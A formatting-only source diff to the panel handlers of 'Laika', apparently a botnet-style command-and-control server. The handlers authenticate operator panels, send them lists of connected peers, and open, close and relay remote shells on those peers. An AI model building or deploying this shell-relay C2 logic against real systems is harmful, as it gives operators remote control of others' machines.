@@ -1,12 +1,13 @@
-#include "lerror.h"
-#include "lmem.h"
+#include "cpanel.h"
 
 #include "cnc.h"
 #include "cpeer.h"
-#include "cpanel.h"
+#include "lerror.h"
+#include "lmem.h"
 
-bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData) {
-    struct sLaika_peer *authPeer = (struct sLaika_peer*)uData;
+bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData)
+{
+    struct sLaika_peer *authPeer = (struct sLaika_peer *)uData;
 
     /* make sure we're not sending connection information to themselves */
     if (peer != authPeer) {
@@ -17,7 +18,8 @@ bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData) {
     return true;
 }
 
-void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
+void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
+{
     laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_ADD_PEER_RES);
 
     /* write the peer's info */
@@ -31,7 +33,8 @@ void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
     laikaS_endOutPacket(authPeer);
 }
 
-void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
+void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer)
+{
     laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_RMV_PEER_RES);
 
     /* write the peer's pubkey */
@@ -43,34 +46,38 @@ void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) 
 
 /* ================================[[ [Auth] Packet Handlers ]]================================= */
 
-void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
+                                         void *uData)
+{
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
     PEERTYPE type;
     int i;
 
     type = laikaS_readByte(&authPeer->sock);
     switch (type) {
-        case PEER_AUTH:
-            /* check that peer's pubkey is authenticated */
-            if (!laikaK_checkAuth(authPeer->peerPub, cnc->authKeys, cnc->authKeysCount))
-                LAIKA_ERROR("unauthorized panel!\n");
+    case PEER_AUTH:
+        /* check that peer's pubkey is authenticated */
+        if (!laikaK_checkAuth(authPeer->peerPub, cnc->authKeys, cnc->authKeysCount))
+            LAIKA_ERROR("unauthorized panel!\n");
 
-            /* notify cnc */
-            laikaC_setPeerType(cnc, authPeer, PEER_AUTH);
-            LAIKA_DEBUG("Accepted authenticated panel %p\n", authPeer);
+        /* notify cnc */
+        laikaC_setPeerType(cnc, authPeer, PEER_AUTH);
+        LAIKA_DEBUG("Accepted authenticated panel %p\n", authPeer);
 
-            /* they passed! send list of our peers */
-            laikaC_iterPeers(cnc, sendPanelPeerIter, (void*)authPeer);
-            break;
-        default:
-            LAIKA_ERROR("unknown peerType [%d]!\n", authPeer->type);
+        /* they passed! send list of our peers */
+        laikaC_iterPeers(cnc, sendPanelPeerIter, (void *)authPeer);
+        break;
+    default:
+        LAIKA_ERROR("unknown peerType [%d]!\n", authPeer->type);
     }
 }
 
-void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
+                                         void *uData)
+{
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
     struct sLaika_peer *peer;
     uint16_t cols, rows;
@@ -91,8 +98,10 @@ void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_
     laikaC_openShell(peer, authPeer, cols, rows);
 }
 
-void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
+                                          void *uData)
+{
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
     struct sLaika_shellInfo *shell;
     uint32_t id;
@@ -106,15 +115,17 @@ void laikaC_handleAuthenticatedShellClose(struct sLaika_peer *authPeer, LAIKAPKT
     laikaC_closeShell(shell);
 }
 
-void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz,
+                                         void *uData)
+{
     uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
-    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
+    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo *)uData;
     struct sLaika_cnc *cnc = pInfo->cnc;
     struct sLaika_peer *peer;
     struct sLaika_shellInfo *shell;
     uint32_t id;
 
-    if (sz-sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH || sz <= sizeof(uint32_t))
+    if (sz - sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH || sz <= sizeof(uint32_t))
         LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Wrong data size!\n");
 
     laikaS_readInt(&authPeer->sock, &id, sizeof(uint32_t));
